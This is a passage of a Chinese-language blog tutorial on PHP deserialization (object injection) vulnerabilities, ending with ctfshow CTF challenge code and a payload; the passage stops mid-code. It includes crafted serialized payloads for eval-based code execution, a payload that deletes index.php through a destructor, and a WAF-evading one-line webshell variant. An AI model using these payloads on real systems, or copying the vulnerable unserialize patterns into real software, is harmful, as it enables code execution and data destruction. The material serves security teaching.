class="hljs-keyword">const</span> SITE = <span class="hljs-string">&#x27;uusama&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;nickname = <span class="hljs-variable">$nickname</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;nickname&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&#x27;sucker&#x27;</span>, <span class="hljs-string">&#x27;damnGG&#x27;</span>, <span class="hljs-string">&#x27;f**k&#x27;</span>);<br>var_dump(serialize(<span class="hljs-variable">$user</span>));<br><br><span class="hljs-comment">//输出：O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;sucker&quot;;s:8:&quot;nickname&quot;;s:6:&quot;damnGG&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h3><p>对象反序列化时会检查是否存在一个<code>__wakeup()</code>方法。如果存在，则会先调用 <code>__wakeup()</code>方法，预先准备对象需要的资源。如果不存在，返回 void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;nickname = <span class="hljs-variable">$nickname</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-keyword">$this</span>-&gt;username;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user_ser</span> = <span class="hljs-string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;sucker&quot;;s:6:&quot;damnGG&quot;;s:4:&quot;f**k&quot;;&#125;&#x27;</span>;<br>var_dump(unserialize(<span class="hljs-variable">$user_ser</span>));<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">输出：</span><br><span class="hljs-comment">object(User)#1 (5) &#123;</span><br><span class="hljs-comment">  [&quot;username&quot;]=&gt;</span><br><span class="hljs-comment">  string(6) &quot;sucker&quot;</span><br><span class="hljs-comment">  [&quot;nickname&quot;]=&gt;</span><br><span class="hljs-comment">  NULL</span><br><span class="hljs-comment">  [&quot;password&quot;:&quot;User&quot;:private]=&gt;</span><br><span class="hljs-comment">  string(6) &quot;sucker&quot;</span><br><span class="hljs-comment">  [&quot;order&quot;:&quot;User&quot;:private]=&gt;</span><br><span class="hljs-comment">  NULL</span><br><span class="hljs-comment">  [&quot;damnGG&quot;]=&gt;</span><br><span class="hljs-comment">  string(4) &quot;f**k&quot;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>PHP 反序列化漏洞又叫做 PHP 对象注入漏洞，反序列化漏洞的成因在于代码中的 unserialize() 接收的参数可控</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/20201112222505683.png"></p><p>修改序列化后的字符串 然后传回代码进行反序列化 而此时恶意代码就被执行了</p><h3 id="覆盖输出"><a href="#覆盖输出" class="headerlink" title="覆盖输出"></a>覆盖输出</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&#x27;demo&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br><span class="hljs-variable">$a_unser</span> = unserialize(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> A();<br><span class="hljs-variable">$b</span>-&gt;test = <span class="hljs-string">&#x27;hello world&#x27;</span>;<br><span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><br><span class="hljs-comment">//得到 O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:11:&quot;hello world&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>传参回去<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210612154244475.png"></p><p>反序列化后就会调用__destruct 函数，同时覆盖$test=demo 输出 hello world</p><h3 id="回马枪"><a href="#回马枪" class="headerlink" title="回马枪"></a>回马枪</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">index</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$return</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;return = <span class="hljs-keyword">new</span> foo();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;return-&gt;action();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please attack me&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$e</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;e);<br>    &#125;<br>&#125;<br>unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">index</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$return</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;return = <span class="hljs-keyword">new</span> evil();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$e</span> = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> index();<br>var_dump(serialize(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">//得到：O:5:&quot;index&quot;:1:&#123;s:13:&quot;indexreturn&quot;;O:4:&quot;evil&quot;:1:&#123;s:1:&quot;e&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br><span class="hljs-comment">//手动修改一下：O:5:&quot;index&quot;:1:&#123;s:13:&quot;%00index%00return&quot;;O:4:&quot;evil&quot;:1:&#123;s:1:&quot;e&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/07/02/.png"></p><h3 id="恶意删除-index-php-等重要文件"><a href="#恶意删除-index-php-等重要文件" class="headerlink" title="恶意删除 index.php 等重要文件"></a>恶意删除 index.php 等重要文件</h3><p>某个 web 应用程序中，log.php 用来产生临时 profile.log(比如用户修改个人信息,修改完(__destruct 被调用)就删除这个临时日志)，目录假如就是根目录，即存在 index.php 前提 log.php 泄露，然后修改用户信息时得知反序列化传参可控，而且也用到了临时日志。</p><p>那么实验开始：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//log.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Logfile</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//log文件名</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;profile.log&#x27;</span>;<br>    <span class="hljs-comment">//创建日志</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logdata</span>(<span class="hljs-params"><span class="hljs-variable">$log</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;log data:&#x27;</span>.<span class="hljs-variable">$log</span>.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>        file_put_contents(<span class="hljs-keyword">$this</span>-&gt;filename,<span class="hljs-variable">$log</span>,FILE_APPEND);<br>    &#125;<br>    <span class="hljs-comment">//destrcuctor删除日志</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Updete successfully!(__destruct deletes &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;filename.<span class="hljs-string">&#x27;)file.&lt;br /&gt;&#x27;</span>;<br>        unlink(dirname(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是一个使用 log.php 的简单例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//test.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;log.php&#x27;</span>;<br><span class="hljs-comment">// 创建一个对象</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> LogFile();<br><span class="hljs-comment">// 设置文件名和要储存的日志数据</span><br><span class="hljs-variable">$obj</span>-&gt;filename = <span class="hljs-string">&#x27;somefile.log&#x27;</span>;<br><span class="hljs-variable">$obj</span>-&gt;LogData(<span class="hljs-string">&#x27;Test&#x27;</span>);<br><span class="hljs-comment">// 脚本结束__destruct被调用somefile.log文件被删除</span><br></code></pre></td></tr></table></figure><p>注释掉 log.php 中的__destructor() 如下</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703014308067.png"></p><p>访问 test.php</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703015954924.png"></p><p>产生了 somefile.log 文件</p><p>恢复__destructor() 就观察不到这个创建和删除的过程</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703020204896.png"></p><p>但经过上面的测试 说明 log.php 可用</p><p>接下来继续</p><p>该网站有其他功能点，也是需要创建临时日志文件的，所以包含了同一个生成日志的类 比如更新用户信息 下面示例代码不含更新操作，显示一下就 ok 了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//提供反序列化的接口文件 profileupdate.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;log.php&#x27;</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PrintData</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;User &#x27;</span> . <span class="hljs-keyword">$this</span>-&gt;name . <span class="hljs-string">&#x27; is &#x27;</span> . <span class="hljs-keyword">$this</span>-&gt;age . <span class="hljs-string">&#x27; years old. &lt;br /&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">// 重建用户输入的数据</span><br><span class="hljs-variable">$usr</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;usr_serialized&#x27;</span>]);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//evil.php 注意，直接访问此文件index.php也会被删除</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;log.php&#x27;</span>;<span class="hljs-comment">//上面已经提到log.php已经泄露，故可以如此构造</span><br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> logfile();<br><span class="hljs-variable">$object</span>-&gt;filename = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$object</span>).<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><br><span class="hljs-comment">//输出：O:7:&quot;Logfile&quot;:1:&#123;s:8:&quot;filename&quot;;s:9:&quot;index.php&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703014910163.png"></p><p>index.php 文件存在可访问</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703020742097.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703021610114.png"></p><p>可见 index.php 被成功删除</p><h3 id="过-WAF-一句话的尝试"><a href="#过-WAF-一句话的尝试" class="headerlink" title="过 WAF 一句话的尝试"></a>过 WAF 一句话的尝试</h3><p>某些情况下 对一句话木马变种</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&#x27;demo&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        @<span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;test);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br><span class="hljs-variable">$len</span> = strlen(<span class="hljs-variable">$test</span>) + <span class="hljs-number">1</span>;<br><span class="hljs-variable">$pp</span> = <span class="hljs-string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:&#x27;</span>.<span class="hljs-variable">$len</span>.<span class="hljs-string">&#x27;:&quot;&#x27;</span>.<span class="hljs-variable">$test</span>.<span class="hljs-string">&#x27;;&quot;;&#125;&#x27;</span>; <span class="hljs-comment">// 构造序列化对象</span><br><span class="hljs-variable">$test_unser</span> = unserialize(<span class="hljs-variable">$pp</span>); <span class="hljs-comment">// 反序列化同时触发_destruct函数</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210612155638097.png"></p><h2 id="ctf-题"><a href="#ctf-题" class="headerlink" title="ctf 题"></a>ctf 题</h2><h3 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>)&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;isVip=<span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> ctfShowUser();<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;checkVip())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;vipOneKeyGetFlag();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload：</p><blockquote><p>GET:username=xxxxxx&amp;password=xxxxxx</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span 